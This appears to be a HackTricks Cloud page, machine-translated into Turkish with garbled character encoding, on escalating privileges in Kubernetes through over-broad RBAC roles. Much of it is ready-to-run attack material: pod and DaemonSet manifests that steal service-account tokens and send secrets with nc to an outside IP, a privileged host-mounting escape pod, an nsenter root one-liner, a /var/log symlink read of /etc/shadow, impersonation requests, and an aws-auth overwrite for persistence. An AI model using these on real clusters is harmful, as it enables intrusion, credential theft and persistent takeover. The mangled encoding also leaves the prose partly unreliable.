# Abusing Roles/ClusterRoles in Kubernetes

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmaya Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)'u **takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

Burada bazÄ± potansiyel olarak tehlikeli Roller ve ClusterRoller yapÄ±landÄ±rmalarÄ±nÄ± bulabilirsiniz.\
`kubectl api-resources` komutuyla desteklenen tÃ¼m kaynaklarÄ± alabilirsiniz.

## **AyrÄ±calÄ±k YÃ¼kseltme**

Kubernetes'te **farklÄ± ayrÄ±calÄ±klara sahip** bir **farklÄ± prensipale eriÅŸim** elde etme sanatÄ± olarak bahsedilen (kubernetes kÃ¼mesi iÃ§inde veya harici bulutlara) ayrÄ±calÄ±klarÄ± yÃ¼kseltmenin temel olarak **4 ana tekniÄŸi** bulunmaktadÄ±r:

* Kubernetes kÃ¼mesi iÃ§inde veya harici bulutlara daha iyi ayrÄ±calÄ±klara sahip olan diÄŸer kullanÄ±cÄ±/grup/SA'larÄ± **taklit edebilme**
* Kendi **pod'larÄ±nÄ±zÄ± oluÅŸturabilme/patchleyebilme/Ã§alÄ±ÅŸtÄ±rabilme** ve kubernetes kÃ¼mesi iÃ§inde veya harici bulutlara daha iyi ayrÄ±calÄ±klara sahip olan SA'larÄ± **bulabilme veya baÄŸlayabilme**
* SA'larÄ±n token'larÄ±nÄ±n saklandÄ±ÄŸÄ± gizli bilgileri **okuyabilme**
* Bir konteynerden bir dÃ¼ÄŸÃ¼me **kaÃ§abilme**, bu sayede dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸan konteynerlerin tÃ¼m gizli bilgilerini, dÃ¼ÄŸÃ¼mÃ¼n kimlik bilgilerini ve bulutta (varsa) dÃ¼ÄŸÃ¼mÃ¼n izinlerini Ã§alabilme
* Bir pod'da **port-forward** Ã§alÄ±ÅŸtÄ±rabilme yeteneÄŸi, bu sayede o pod iÃ§inde ilginÃ§ kaynaklara eriÅŸebilme olasÄ±lÄ±ÄŸÄ±na sahip olabilirsiniz.

### Herhangi Bir KaynaÄŸa veya Fiile EriÅŸim (Joker)

**Joker (\*) herhangi bir kaynaÄŸa herhangi bir fiil ile eriÅŸim izni verir**. Bu, yÃ¶neticiler tarafÄ±ndan kullanÄ±lÄ±r. Bir ClusterRole iÃ§inde bu, saldÄ±rganÄ±n kÃ¼medeki herhangi bir ad alanÄ±nÄ± kÃ¶tÃ¼ye kullanabileceÄŸi anlamÄ±na gelir.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```

### Belirli bir fiil ile Herhangi Bir KaynaÄŸa EriÅŸim

RBAC'de, bazÄ± izinler Ã¶nemli riskler oluÅŸturur:

1. **`create`:** Herhangi bir kÃ¼me kaynaÄŸÄ±nÄ± oluÅŸturma yetkisi verir ve ayrÄ±calÄ±k yÃ¼kselmesine neden olabilir.
2. **`list`:** TÃ¼m kaynaklarÄ± listeleme izni verir ve hassas verilerin sÄ±zmasÄ±na neden olabilir.
3. **`get`:** Hizmet hesaplarÄ±ndan gizli bilgilere eriÅŸimi saÄŸlar ve gÃ¼venlik tehdidi oluÅŸturur.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```

### Pod OluÅŸturma - Token Ã‡alma

Bir saldÄ±rgan, bir pod oluÅŸturma izinlerine sahipse, pod'a ayrÄ±calÄ±klÄ± bir Hizmet HesabÄ± ekleyebilir ve Hizmet HesabÄ±'nÄ± taklit etmek iÃ§in token'Ä± Ã§alabilir. Bu ÅŸekilde ayrÄ±calÄ±klarÄ± artÄ±rabilir.

SaldÄ±rganÄ±n `bootstrap-signer` hizmet hesabÄ±nÄ±n token'Ä±nÄ± Ã§alacak ve saldÄ±rgana gÃ¶nderecek bir pod Ã¶rneÄŸi:

```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```

### Pod OluÅŸturma ve KaÃ§Ä±ÅŸ

AÅŸaÄŸÄ±daki, bir konteynerin sahip olabileceÄŸi tÃ¼m ayrÄ±calÄ±klarÄ± gÃ¶sterir:

* **AyrÄ±calÄ±klÄ± eriÅŸim** (korumalarÄ± devre dÄ±ÅŸÄ± bÄ±rakma ve yetenekleri ayarlama)
* AyrÄ±calÄ±klarÄ± yÃ¼kseltmeye yardÄ±mcÄ± olabilecek **hostIPC** ve **hostPid** ad alanlarÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakma
* **hostNetwork** ad alanÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakma, dÃ¼ÄŸÃ¼mlerin bulut ayrÄ±calÄ±klarÄ±nÄ± Ã§almak ve aÄŸlara daha iyi eriÅŸim saÄŸlama
* Konteyner iÃ§inde **ana bilgisayarÄ±n /** dizinini baÄŸlama

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

AÅŸaÄŸÄ±daki komutla pod oluÅŸturun:

```bash
kubectl --token $token create -f mount_root.yaml
```

Bu [tweet'ten](https://twitter.com/mauilion/status/1129468485480751104) bir satÄ±r ve bazÄ± eklemelerle:

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Åimdi, dÃ¼ÄŸÃ¼mden kaÃ§abildiÄŸinizi kontrol edebilirsiniz. Post-exploitasyon tekniklerine geÃ§elim:

#### Gizlilik

Muhtemelen daha **gizli** olmak istersiniz, aÅŸaÄŸÄ±daki sayfalarda, Ã¶nceki ÅŸablonda belirtilen bazÄ± yetkilendirmeleri etkinleÅŸtirerek yalnÄ±zca eriÅŸebileceÄŸiniz ÅŸeyleri gÃ¶rebilirsiniz:

* **AyrÄ±calÄ±klÄ± + hostPID**
* **YalnÄ±zca ayrÄ±calÄ±klÄ±**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Ã–nceki ayrÄ±calÄ±klÄ± pod yapÄ±landÄ±rmalarÄ±nÄ± nasÄ±l oluÅŸturup kÃ¶tÃ¼ye kullanacaÄŸÄ±nÄ±zÄ±n Ã¶rneÄŸini_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _adresinde bulabilirsiniz._

### Pod OluÅŸturma - Buluta GeÃ§iÅŸ

Bir **pod** (ve isteÄŸe baÄŸlÄ± olarak bir **hizmet hesabÄ±**) **oluÅŸturabiliyorsanÄ±z**, bir poda veya hizmet hesabÄ±na **bulut rolleri atayarak bulut ortamÄ±nda ayrÄ±calÄ±klar elde edebilir** ve ardÄ±ndan buna eriÅŸebilirsiniz.\
AyrÄ±ca, **ana bilgisayar aÄŸÄ± ad alanÄ±na sahip bir pod oluÅŸturabilirseniz**, **dÃ¼ÄŸÃ¼m** Ã¶rneÄŸinin **IAM** rolÃ¼nÃ¼ Ã§alabilirsiniz.

Daha fazla bilgi iÃ§in kontrol edin:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Deployment, Daemonset, Statefulset, Replicationcontroller, Replicaset, Job ve Cronjob OluÅŸturma/DeÄŸiÅŸtirme**

Bu izinleri kÃ¶tÃ¼ye kullanarak Ã¶nceki Ã¶rnekte olduÄŸu gibi yeni bir pod oluÅŸturmak ve ayrÄ±calÄ±klarÄ±nÄ± ele geÃ§irmek mÃ¼mkÃ¼ndÃ¼r.

AÅŸaÄŸÄ±daki yaml, bir daemonset oluÅŸturur ve pod iÃ§indeki SA'nÄ±n belirteci Ã§alÄ±nÄ±r:

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```

### **Podlar Exec**

**`pods/exec`**, kubernetes'te bir kaynak olan **bir pod iÃ§inde kabukta komut Ã§alÄ±ÅŸtÄ±rmak** iÃ§in kullanÄ±lÄ±r. Bu, **konteynerlerin iÃ§inde komut Ã§alÄ±ÅŸtÄ±rmaya veya bir kabuÄŸa girmeye** olanak saÄŸlar.

Bu nedenle, bir pod'un iÃ§ine girip SA'nÄ±n token'Ä±nÄ± Ã§almak mÃ¼mkÃ¼ndÃ¼r veya ayrÄ±calÄ±klÄ± bir pod'a girmek, dÃ¼ÄŸÃ¼mden kaÃ§mak ve dÃ¼ÄŸÃ¼mdeki tÃ¼m podlarÄ±n token'larÄ±nÄ± Ã§almak ve dÃ¼ÄŸÃ¼mÃ¼ (kÃ¶tÃ¼ye) kullanmak mÃ¼mkÃ¼ndÃ¼r:

```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```

### port-forward

Bu izin, belirtilen pod iÃ§indeki bir porta bir yerel portu yÃ¶nlendirmek iÃ§in kullanÄ±lÄ±r. Bu, bir pod iÃ§inde Ã§alÄ±ÅŸan uygulamalarÄ± kolayca hata ayÄ±klamak iÃ§in kullanÄ±lmasÄ± amaÃ§lanmÄ±ÅŸtÄ±r, ancak bir saldÄ±rgan, bir pod iÃ§indeki ilginÃ§ (Ã¶rneÄŸin DB'ler) veya savunmasÄ±z uygulamalara (web?) eriÅŸmek iÃ§in bunu kÃ¶tÃ¼ye kullanabilir:

```
kubectl port-forward pod/mypod 5000:5000
```

### Ana Makinelere YazÄ±labilir /var/log/ KaÃ§Ä±ÅŸÄ±

[**Bu araÅŸtÄ±rmada belirtildiÄŸi gibi**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), **ana makinede `/var/log/` dizini baÄŸlanmÄ±ÅŸ** bir pod'a eriÅŸebilir veya oluÅŸturabilirseniz, konteynerden **kaÃ§abilirsiniz**.\
Bu temel olarak, **Kube-API'nin bir konteynerin gÃ¼nlÃ¼klerini almak** iÃ§in (`kubectl logs <pod>` kullanarak) pod'un `/logs/` uÃ§ noktasÄ±nÄ± kullanarak **`0.log`** dosyasÄ±nÄ± istemesidir.\
Kubelet servisi, konteynerin `/var/log` dosya sistemini temel olarak **aÃ§Ä±ÄŸa Ã§Ä±karan** `/logs/` uÃ§ noktasÄ±nÄ± sunar.

Bu nedenle, bir saldÄ±rganÄ±n konteynerin **/var/log/ klasÃ¶rÃ¼ne yazma eriÅŸimi** olduÄŸunda bu davranÄ±ÅŸlarÄ± 2 ÅŸekilde kÃ¶tÃ¼ye kullanabileceÄŸi:

* Konteynerin `0.log` dosyasÄ±nÄ± (genellikle `/var/logs/pods/namespace_pod_uid/container/0.log` konumunda bulunur) Ã¶rneÄŸin `/etc/shadow`'a iÅŸaret eden bir **sembolik baÄŸlantÄ±** yaparak deÄŸiÅŸtirmek. ArdÄ±ndan, ana makinenin shadow dosyasÄ±nÄ± Ã§Ä±karabilirsiniz:

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```

* EÄŸer saldÄ±rgan, `nodes/log`'u okuma iznine sahip herhangi bir baÅŸlÄ±ÄŸÄ± kontrol ediyorsa, `/host-mounted/var/log/sym`'de bir **sembolik baÄŸlantÄ±** oluÅŸturabilir ve `https://<gateway>:10250/logs/sym/`'e eriÅŸtiÄŸinde ana bilgisayarÄ±n kÃ¶k dosya sistemini listeleyebilir (sembolik baÄŸlantÄ±yÄ± deÄŸiÅŸtirmek dosyalara eriÅŸim saÄŸlayabilir).

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```

**Bypassing readOnly protection**

EÄŸer ÅŸanslÄ±ysanÄ±z ve yÃ¼ksek ayrÄ±calÄ±klÄ± `CAP_SYS_ADMIN` yeteneÄŸi mevcutsa, sadece klasÃ¶rÃ¼ rw olarak yeniden baÄŸlayabilirsiniz:

```bash
mount -o rw,remount /hostlogs/
```

#### hostPath readOnly korumasÄ±nÄ± atlatma <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**Bu araÅŸtÄ±rmada**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) belirtildiÄŸi gibi, korumayÄ± atlamak mÃ¼mkÃ¼ndÃ¼r:

```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```

Bu, Ã¶ncekiler gibi kaÃ§Ä±ÅŸlarÄ± Ã¶nlemek iÃ§in bir hostPath baÄŸlama noktasÄ± kullanmak yerine, bir PersistentVolume ve bir PersistentVolumeClaim kullanarak bir ana bilgisayar klasÃ¶rÃ¼nÃ¼ yazÄ±labilir eriÅŸimle bir konteynere baÄŸlamak iÃ§in kullanÄ±lan bir yÃ¶ntemdir.

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```

### **AyrÄ±calÄ±klÄ± hesaplarÄ± taklit etmek**

Bir [**kullanÄ±cÄ± taklit etme**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) yetkisi ile saldÄ±rgan, ayrÄ±calÄ±klÄ± bir hesabÄ± taklit edebilir.

Bir kullanÄ±cÄ±yÄ± taklit etmek iÃ§in `kubectl` komutunda `--as=<kullanÄ±cÄ±adÄ±>` parametresini kullanÄ±n veya bir grup taklit etmek iÃ§in `--as-group=<grup>` parametresini kullanÄ±n:

```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```

Veya REST API'sini kullanÄ±n:

```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### SÄ±rlarÄ± Listeleme

**SÄ±rlarÄ± listeleme izni, saldÄ±rganÄ±n gerÃ§ekten sÄ±rlarÄ± okumasÄ±na izin verebilir** REST API uÃ§ noktasÄ±na eriÅŸerek.

```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### Bir sÄ±rrÄ± okuma - belirli bir token ID'sini brute-force etme

Okuma izinlerine sahip bir saldÄ±rganÄ±n, sÄ±rrÄ± kullanmak iÃ§in tam adÄ±nÄ± bilmesi gerekmektedir. Ancak, daha geniÅŸ bir _**sÄ±rlarÄ± listeleme**_ yetkisinden farklÄ± olarak, hala gÃ¼venlik aÃ§Ä±klarÄ± bulunmaktadÄ±r. Sistemdeki varsayÄ±lan hizmet hesaplarÄ± numaralandÄ±rÄ±labilir ve her biri bir sÄ±r ile iliÅŸkilendirilebilir. Bu sÄ±rlarÄ±n bir ad yapÄ±sÄ± vardÄ±r: statik bir Ã¶nek ve ardÄ±ndan bir rastgele beÅŸ karakterlik alfasayÄ±sal belirteÃ§ (belirli karakterleri hariÃ§ tutarak) [kaynak koduna](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83) gÃ¶re.

BelirteÃ§, tam alfasayÄ±sal aralÄ±ÄŸÄ±n yerine sÄ±nÄ±rlÄ± bir 27 karakterlik kÃ¼meden (`bcdfghjklmnpqrstvwxz2456789`) oluÅŸturulur. Bu sÄ±nÄ±rlama, toplam olasÄ± kombinasyonlarÄ± 14,348,907'ye (27^5) indirger. SonuÃ§ olarak, bir saldÄ±rgan, hassas hizmet hesaplarÄ±na eriÅŸerek ayrÄ±calÄ±k yÃ¼kseltmesine yol aÃ§abilecek bir brute-force saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilir.

### Sertifika Ä°mzalama Ä°stekleri

EÄŸer `certificatesigningrequests` kaynaÄŸÄ±nda **`create`** fiillerine sahipseniz (veya en azÄ±ndan `certificatesigningrequests/nodeClient` iÃ§inde), yeni bir dÃ¼ÄŸÃ¼mÃ¼n **yeni bir CeSR'sini oluÅŸturabilirsiniz**.

[Belgelendirmeye](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/) gÃ¶re, bu istekleri otomatik olarak onaylamak mÃ¼mkÃ¼ndÃ¼r, bu durumda **ek izinlere ihtiyaÃ§ duymazsÄ±nÄ±z**. Aksi takdirde, isteÄŸi onaylayabilmeniz iÃ§in `certificatesigningrequests/approval` iÃ§inde gÃ¼ncelleme yapabilmeniz ve `signers` iÃ§inde `<signerNameDomain>/<signerNamePath>` veya `<signerNameDomain>/*` ile onaylayabilmeniz gerekmektedir.

TÃ¼m gerekli izinlere sahip bir rolÃ¼n **Ã¶rneÄŸi** ÅŸu ÅŸekildedir:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```

Yeni dÃ¼ÄŸÃ¼m CSR onaylandÄ±ktan sonra, dÃ¼ÄŸÃ¼mlerin Ã¶zel izinlerini **kÃ¶tÃ¼ye kullanarak** sÄ±rlarÄ± **Ã§almak** ve **yetkileri yÃ¼kseltmek** mÃ¼mkÃ¼n.

[**Bu yazÄ±da**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) ve [**bu yazÄ±da**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) GKE K8s TLS Bootstrap yapÄ±landÄ±rmasÄ± **otomatik imzalama** ile yapÄ±landÄ±rÄ±lmÄ±ÅŸ ve yeni bir K8s DÃ¼ÄŸÃ¼mÃ¼nÃ¼n kimlik bilgilerini oluÅŸturmak ve ardÄ±ndan bu kimlik bilgilerini kullanarak yetkileri yÃ¼kseltmek iÃ§in kÃ¶tÃ¼ye kullanÄ±lmÄ±ÅŸtÄ±r.\
EÄŸer **sÃ¶z konusu yetkilere sahipseniz aynÄ± ÅŸeyi yapabilirsiniz**. Ä°lk Ã¶rnekte, dÃ¼ÄŸÃ¼m yalnÄ±zca Ã¼zerine baÄŸlanmÄ±ÅŸ olan konteynerlerin sÄ±rlarÄ±na eriÅŸimi engelleyen hatayÄ± atlatÄ±r.

Bunu atlatmanÄ±n yolu, sÄ±rlarÄ± Ã§almak istediÄŸiniz konteynerin baÄŸlÄ± olduÄŸu dÃ¼ÄŸÃ¼m adÄ± iÃ§in bir dÃ¼ÄŸÃ¼m kimlik bilgisi oluÅŸturmaktÄ±r (ancak bunu nasÄ±l yapacaÄŸÄ±nÄ±zÄ± ilk yazÄ±da kontrol edin):

```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```

### AWS EKS aws-auth configmaps

AWS'de bulunan EKS (Elastic Kubernetes Service) kÃ¼mesinde kube-system ad alanÄ±nda **`configmaps`** deÄŸiÅŸtirebilen yetkililer, **aws-auth** configmap'i Ã¼zerine yazarak kÃ¼me yÃ¶netici ayrÄ±calÄ±klarÄ±nÄ± elde edebilirler.\
Gerekli fiiller **`update`** ve **`patch`** veya configmap oluÅŸturulmadÄ±ysa **`create`**'dir:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**DiÄŸer hesaplardan** kullanÄ±cÄ±lara eriÅŸim saÄŸlamak iÃ§in **kalÄ±cÄ±lÄ±k** iÃ§in **`aws-auth`** kullanabilirsiniz.

Ancak, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **farklÄ± bir hesaptan Ã§alÄ±ÅŸmaz**. Ancak aslÄ±nda `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` Ã§alÄ±ÅŸÄ±r, sadece ad yerine kÃ¼menin ARN'sini koyarsanÄ±z.\
`kubectl`'nin Ã§alÄ±ÅŸmasÄ± iÃ§in, sadece **hedefin kubeconfig'ini yapÄ±landÄ±rÄ±n** ve aws exec args'a `--profile other_account_role` ekleyin, bÃ¶ylece kubectl, tokeni almak ve AWS ile iletiÅŸim kurmak iÃ§in diÄŸer hesap profiline kullanacaktÄ±r.
{% endhint %}

### GKE'de YÃ¼kseltme

GCP prensiplerine K8s izinleri atamanÄ±n **2 yolu** vardÄ±r. Her durumda, prensip ayrÄ±ca kÃ¼me eriÅŸimi iÃ§in kimlik bilgilerini toplayabilmesi iÃ§in **`container.clusters.get`** iznine de ihtiyaÃ§ duyar veya kendi kubectl yapÄ±landÄ±rma dosyanÄ±zÄ± **oluÅŸturmanÄ±z** gerekecektir (aÅŸaÄŸÄ±daki baÄŸlantÄ±yÄ± takip edin).

{% hint style="warning" %}
K8s api uÃ§ noktasÄ±yla konuÅŸurken, **GCP kimlik doÄŸrulama belirteci gÃ¶nderilecektir**. ArdÄ±ndan, GCP, K8s api uÃ§ noktasÄ± aracÄ±lÄ±ÄŸÄ±yla, Ã¶ncelikle prensibin (e-posta ile) kÃ¼me iÃ§inde herhangi bir eriÅŸime sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol edecek, ardÄ±ndan GCP IAM Ã¼zerinden herhangi bir eriÅŸime sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol edecektir.\
EÄŸer bunlardan **herhangi biri doÄŸruysa**, yanÄ±t verilecektir. EÄŸer doÄŸru deÄŸilse, GCP IAM Ã¼zerinden izin verilmesi Ã¶nerisinde bulunan bir **hata** verilecektir.
{% endhint %}

Ä°lk yÃ¶ntem, **GCP IAM**'Ä± kullanmaktÄ±r, K8s izinlerinin **eÅŸdeÄŸer GCP IAM izinleri** vardÄ±r ve prensip bunlara sahipse kullanabilir.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Ä°kinci yÃ¶ntem, kullanÄ±cÄ±yÄ± **e-posta** (GCP hizmet hesaplarÄ± dahil) ile tanÄ±mlayarak kÃ¼me iÃ§inde **K8s izinleri atamaktÄ±r**.

### serviceaccounts token oluÅŸturma

TokenRequests (`serviceaccounts/token`) oluÅŸturabilen prensipler K8s api uÃ§ noktasÄ±yla konuÅŸurken SAs oluÅŸturabilir (bilgi [**burada**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

**`pods/ephemeralcontainers`**'Ä± **`gÃ¼ncelleme`** veya **`yama`** yapabilen prensipler, bir **geÃ§ici konteyner** ekleyerek **diÄŸer podlarda kod yÃ¼rÃ¼tebilir** ve potansiyel olarak bir ayrÄ±calÄ±klÄ± securityContext ile kendi dÃ¼ÄŸÃ¼mÃ¼nden Ã§Ä±kabilir.

### ValidatingWebhookConfigurations veya MutatingWebhookConfigurations

`validatingwebhookconfigurations` veya `mutatingwebhookconfigurations` Ã¼zerinde `oluÅŸturma`, `gÃ¼ncelleme` veya `yama` fiillerinden herhangi birine sahip olan prensipler, ayrÄ±calÄ±klarÄ± yÃ¼kseltmek iÃ§in **bu tÃ¼r bir webhook yapÄ±landÄ±rmasÄ±nÄ± oluÅŸturabilir**.

[`mutatingwebhookconfigurations` Ã¶rneÄŸi iÃ§in bu bÃ¶lÃ¼me bakÄ±n](./#malicious-admission-controller).

### YÃ¼kseltme

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde okuyabileceÄŸiniz gibi: [**Dahili AyrÄ±calÄ±klÄ± YÃ¼kseltme Ã–nlemleri**](./#built-in-privileged-escalation-prevention), bir prensip, bu yeni izinlere sahip olmadan rolleri veya kÃ¼me rollerini gÃ¼ncelleyemez veya oluÅŸturamaz. Ancak **`escalate`** fiiline sahipse **`roles`** veya **`clusterroles`** Ã¼zerinde, kendisinden daha iyi izinlere sahip yeni rolleri veya kÃ¼me rollerini gÃ¼ncelleyebilir/oluÅŸturabilir.

### Nodes proxy

**`nodes/proxy`** alt kaynaÄŸÄ±na eriÅŸimi olan prensipler, Kubelet API'si aracÄ±lÄ±ÄŸÄ±yla podlarda kod **yÃ¼rÃ¼tebilir** (buradan [**bu**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego) bilgiye gÃ¶re). Kubelet kimlik doÄŸrulamasÄ± hakkÄ±nda daha fazla bilgi iÃ§in bu sayfaya bakÄ±n:

